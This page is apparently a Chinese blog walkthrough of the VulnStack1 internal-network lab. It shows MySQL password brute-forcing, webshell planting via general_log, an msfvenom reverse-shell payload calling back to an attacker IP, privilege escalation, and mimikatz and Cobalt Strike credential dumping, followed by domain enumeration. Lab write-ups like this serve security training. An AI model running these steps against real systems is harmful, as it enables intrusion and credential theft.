@@ -1,0 +1,978 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/leekos.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] 【内网渗透】红日VulnStack1信息收集首先nmap扫ip 123456nmap -sP 192.168.56.0&#x2F;24Nmap scan report for 192.168.56.143Host is up (0.00028s latency).MAC Address: 00:0C:29:E4:51:45 (VMware)  然后扫描ip详细信息： 1nmap -T4 -A 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【内网渗透】红日VulnStack1">
+<meta property="og:url" content="https://leekosss.github.io/2023/09/17/[%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F]vulnStack1/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] 【内网渗透】红日VulnStack1信息收集首先nmap扫ip 123456nmap -sP 192.168.56.0&#x2F;24Nmap scan report for 192.168.56.143Host is up (0.00028s latency).MAC Address: 00:0C:29:E4:51:45 (VMware)  然后扫描ip详细信息： 1nmap -T4 -A 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171939978.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171940300.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171943285.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171946335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171946064.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171954353.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171959450.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172002843.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172009964.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172010513.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172010825.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172015825.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211415917.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211441835.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211445388.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211445849.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172110326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172111088.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172112699.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172112992.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172113458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172115633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172118055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172121993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211502782.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211503910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211506342.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211507211.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211511142.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211524006.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211529075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211528694.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211542023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211548712.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211549975.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211559564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211601226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211604521.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211606636.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211609874.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211617322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211644806.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211710172.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211711309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211734766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211736371.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211744886.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211744395.png">
+<meta property="article:published_time" content="2023-09-17T11:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-21T09:59:08.629Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="【内网渗透】红日VulnStack1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171939978.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>【内网渗透】红日VulnStack1 - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【内网渗透】红日VulnStack1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-17 19:00" pubdate>
+          2023年9月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          45 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">【内网渗透】红日VulnStack1</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年9月21日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="【内网渗透】红日VulnStack1"><a href="#【内网渗透】红日VulnStack1" class="headerlink" title="【内网渗透】红日VulnStack1"></a>【内网渗透】红日VulnStack1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先nmap扫ip</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.56.0</span>/<span class="hljs-number">24</span><br><br><br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.56.143</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00028</span>s latency).<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:E4:<span class="hljs-number">51</span>:<span class="hljs-number">45</span> (VMware)<br></code></pre></td></tr></table></figure>
+
+<p>然后扫描ip详细信息：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -T4 -<span class="hljs-keyword">A</span> <span class="hljs-number">192.168.56.143</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171939978.png" srcset="/img/loading.gif" lazyload alt="image-20230917193830683"></p>
+<p>扫描到80和3306端口，访问一下：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171940300.png" srcset="/img/loading.gif" lazyload alt="image-20230917194024213"></p>
+<p>这里可以检测mysql数据库的账号密码是否正确，于是猜测账号:<code>root</code>，爆破密码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171943285.png" srcset="/img/loading.gif" lazyload alt="image-20230917194339243"></p>
+<p>爆破出密码为<code>root</code>，于是我们使用<code>dirsearch</code>扫一下目录：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.143</span>/<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171946335.png" srcset="/img/loading.gif" lazyload alt="image-20230917194613294"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171946064.png" srcset="/img/loading.gif" lazyload alt="image-20230917194631995"></p>
+<p>使用刚刚爆破出来的密码登录数据库</p>
+<p>mysql getshell有两种思路：</p>
+<ul>
+<li>select … into outfile …</li>
+<li>general_log</li>
+</ul>
+<p><code>into outfile</code>写入shell是有条件的：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">使用需看要secure_file_priv的值。<br>当value为“<span class="hljs-literal">null</span>”时，不允许读取任意文件<br>当value为“空”时，允许读取任意文件<br>value可也已设置为其他路径。<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171954353.png" srcset="/img/loading.gif" lazyload alt="image-20230917195341541"></p>
+<p>这里查询出<code>secure_file_priv=NULL</code>，说明这条路行不通了</p>
+<p>所以这里需要采取另一种方式</p>
+<h3 id="mysql慢日志getshell"><a href="#mysql慢日志getshell" class="headerlink" title="mysql慢日志getshell"></a>mysql慢日志getshell</h3><blockquote>
+<p>慢日志：</p>
+<p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。<strong>如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中</strong>。</p>
+</blockquote>
+<p>查看服务器默认时间值方式如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> &quot;%long_query_time%&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309171959450.png" srcset="/img/loading.gif" lazyload alt="image-20230917195929411"></p>
+<p>这里是10秒</p>
+<p>想要通过mysql日志导入木马，我们先执行命令，查看日志状态：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> &quot;%general%&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172002843.png" srcset="/img/loading.gif" lazyload alt="image-20230917200251813"></p>
+<p>当开启<code>general_log=on</code>时，SQL执行的sql语句的会记录在<code>stu1.log</code>中，如果我们可以修改<code>general_log_file</code>的值，那么生成的文件就可控，进而可getshell</p>
+<p>所以执行命令：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>这时<code>general_log</code>已经打开了</p>
+<p>然后执行：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpStudy/www/shell.php&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>修改日志写入<code>shell.php</code>中</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172009964.png" srcset="/img/loading.gif" lazyload alt="image-20230917200913934"></p>
+<p>接下来执行sql语句，即可将一个话木马写入shell.php中</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172010513.png" srcset="/img/loading.gif" lazyload alt="image-20230917201022482"></p>
+<p>成功写入：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172010825.png" srcset="/img/loading.gif" lazyload alt="image-20230917201040775"></p>
+<p>蚁剑直接连接上去：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172015825.png" srcset="/img/loading.gif" lazyload alt="image-20230917201454395"></p>
+<p>发现是管理员权限(但似乎是<strong>域用户</strong>)</p>
+<p>接下来就进入内网渗透了</p>
+<h3 id="内网信息探测"><a href="#内网信息探测" class="headerlink" title="内网信息探测"></a>内网信息探测</h3><h4 id="win7上线msf"><a href="#win7上线msf" class="headerlink" title="win7上线msf"></a>win7上线msf</h4><p>首先创建一个msf木马：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.56.132 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; msf.exe<br></code></pre></td></tr></table></figure>
+
+<p>使用蚁剑上传<code>msf.exe</code></p>
+<p>然后msf开启监听，同时运行msf.exe</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211415917.png" srcset="/img/loading.gif" lazyload alt="image-20230921141520778"></p>
+<p>成功反弹到msf上了，我们尝试一下基础提权：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis">meterpreter &gt; getuid<br>Server username: GOD\Administrator<br>meterpreter &gt; get<span class="hljs-params">system</span><br>...got <span class="hljs-params">system</span> via technique <span class="hljs-number">1</span> (Named Pipe Impersonation (In Memory/<span class="hljs-literal">Admin</span>)).<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\<span class="hljs-params">SYSTEM</span><br></code></pre></td></tr></table></figure>
+
+<p>提权成系统权限</p>
+<h5 id="mimikatz获取账号密码"><a href="#mimikatz获取账号密码" class="headerlink" title="mimikatz获取账号密码"></a>mimikatz获取账号密码</h5><p>加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程，而且该进程也需要是<strong>system权限</strong>运行的</p>
+<p>我们使用msf 的ps命令查看一下进程：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211441835.png" srcset="/img/loading.gif" lazyload alt="image-20230921144154777"></p>
+<p>这里的500进程是<code>system</code>权限，我们迁移到该进程，然后加载mimikatz，执行命令</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">migrate PID<br>load mimikatz<br>mimikatz_command -f sekurlsa::searchPasswords<br></code></pre></td></tr></table></figure>
+
+<p>现在提示<code>mimikatz</code>在msf中被<code>kiwi</code>取代了，所以我们使用<code>kiwi</code>模块</p>
+<p>查看一下如何使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; <span class="hljs-built_in">help</span> kiwi<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211445388.png" srcset="/img/loading.gif" lazyload alt="image-20230921144527348"></p>
+<p>执行这个命令，获得账号密码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211445849.png" srcset="/img/loading.gif" lazyload alt="image-20230921144557792"></p>
+<h4 id="win7靶机上线Cobalt-Strike"><a href="#win7靶机上线Cobalt-Strike" class="headerlink" title="win7靶机上线Cobalt Strike"></a>win7靶机上线Cobalt Strike</h4><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172110326.png" srcset="/img/loading.gif" lazyload alt="image-20230917211028216"></p>
+<p>kali运行cs server端</p>
+<p>然后我们win11运行client端，输入密码：<code>123456</code></p>
+<p>添加一个cs监听器：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172111088.png" srcset="/img/loading.gif" lazyload alt="image-20230917211141011"></p>
+<p>然后生成win后门文件：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172112699.png" srcset="/img/loading.gif" lazyload alt="image-20230917211222910"></p>
+<p>选择之前那个监听器：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172112992.png" srcset="/img/loading.gif" lazyload alt="image-20230917211259950"></p>
+<p>将exe上传至靶机，运行一下即可上线cs：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172113458.png" srcset="/img/loading.gif" lazyload alt="image-20230917211340419"></p>
+<p>在cs中运行命令前面要加上<code>shell</code>，我们查一下ip</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> ipconfig</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172115633.png" srcset="/img/loading.gif" lazyload alt="image-20230917211507584"></p>
+<p><code>hashdump</code>可以查看经过hash加密的密码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172118055.png" srcset="/img/loading.gif" lazyload alt="image-20230917211842023"></p>
+<p>我们可以通过<code>mimikatz</code>来获得明文密码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309172121993.png" srcset="/img/loading.gif" lazyload alt="image-20230917212051972"></p>
+<p>得到域用户的账号与密码</p>
+<h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">net view                 # 查看局域网内其他主机名<br>net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 # 查看本机用户列表<br>net user /domain         # 查看域用户<br>net localgroup administrators # 查看本地管理员组（通常会有域用户）<br>net view /domain         # 查看有几个域<br>net user 用户名 /domain   # 获取指定域用户的信息<br>net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    # 查看域中某工作组<br>net group &quot;domain admins&quot; /domain  # 查看域管理员的名字<br>net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名<br>net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）<br></code></pre></td></tr></table></figure>
+
+<p>此处使用<code>Cobalt Strike</code>演示</p>
+<p><code>ipconfig /all</code>查看到了内网ip，并且有域：<code>god.org</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211502782.png" srcset="/img/loading.gif" lazyload alt="image-20230921150205736"></p>
+<p>或者可以使用<code>net config Workstation</code>来查看当前计算机名、全名、用户名、系统版本、工作站、域、登录域等全面的信息：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211503910.png" srcset="/img/loading.gif" lazyload alt="image-20230921150346866"></p>
+<p>上面发现 DNS 服务器名为 <code>god.org</code>，当前登录域为 GOD，那么我们执行：<code>net view /domain</code> 查看有几个域(可能不止一个域)</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211506342.png" srcset="/img/loading.gif" lazyload alt="image-20230921150622378"></p>
+<p>查看一下同一个域中的机器：<code>net view</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211507211.png" srcset="/img/loading.gif" lazyload alt="image-20230921150743176"></p>
+<p>判断主域 域控制器 <code>net time /domain</code></p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211511142.png" srcset="/img/loading.gif" lazyload alt="image-20230921151105093" style="zoom: 33%;" />
+
+
+
+<p>查看一下域用户，<code>net user /domain </code></p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211524006.png" srcset="/img/loading.gif" lazyload alt="image-20230921152426943" style="zoom:50%;" />
+
+
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">整理一下信息<br>域：god<span class="hljs-selector-class">.org</span><br>域内有三个用户：Administrator、ligang、liukaifeng01<br>域内三台主机：<span class="hljs-built_in">ROOT-TVI862UBEH</span>(<span class="hljs-number">192.168</span>.<span class="hljs-number">52.141</span>)、<span class="hljs-built_in">STU1</span>(win7)、OWA<br>域控：<span class="hljs-built_in">OWA</span>(<span class="hljs-number">192.168</span>.<span class="hljs-number">52.138</span>)<br> win7内网ip：<span class="hljs-number">192.168</span><span class="hljs-selector-class">.52</span><span class="hljs-selector-class">.88</span><br></code></pre></td></tr></table></figure>
+
+<p>在cs中继续执行命名<code>net view</code>查看查看局域网内其他主机信息（主机名称、IP地址），可得知域控主机的 IP 为 <code>192.168.52.138</code>，如下图所示：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211529075.png" srcset="/img/loading.gif" lazyload alt="image-20230921152927025"></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202309211528694.png" srcset="/img/loading.gif" lazyload alt="image-20230921152821654"></p>
+<p>至此内网域信息搜集完毕，已经明确了域控主机为<code>192.168.52.138</code>，同时还存在另一台域成员<code>192.168.52.141</code>，接下来的目标就是横向渗透拿下域控！</p>
+<h3 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h3><h4 id="添加路由、挂socks代理"><a href="#添加路由、挂socks代理" class="headerlink" title="添加路由、挂socks代理"></a>添加路由、挂socks代理</h4><p><strong>添加路由</strong>的目的是为了让MSF其他模块能访问内网的其他主机，即52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递</p>
+<p><strong>添加socks4a代理</strong>的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
